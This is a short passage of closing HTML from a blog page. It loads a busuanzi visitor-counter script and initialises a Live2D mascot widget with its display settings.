+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
